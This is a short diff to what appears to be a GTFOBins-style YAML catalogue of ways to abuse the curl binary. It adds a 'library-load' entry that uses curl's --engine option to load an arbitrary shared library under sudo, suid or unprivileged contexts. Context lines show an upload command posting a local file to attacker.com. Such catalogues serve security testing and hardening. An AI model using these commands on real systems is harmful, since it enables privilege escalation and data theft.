@@ -23,6 +23,13 @@ functions:
       sudo:
       suid:
       unprivileged:
+  library-load:
+  - code: |-
+      curl --engine /path/to/lib.so x
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
   upload:
   - code: |-
       curl -X POST --data-binary @/path/to/input-file http://attacker.com
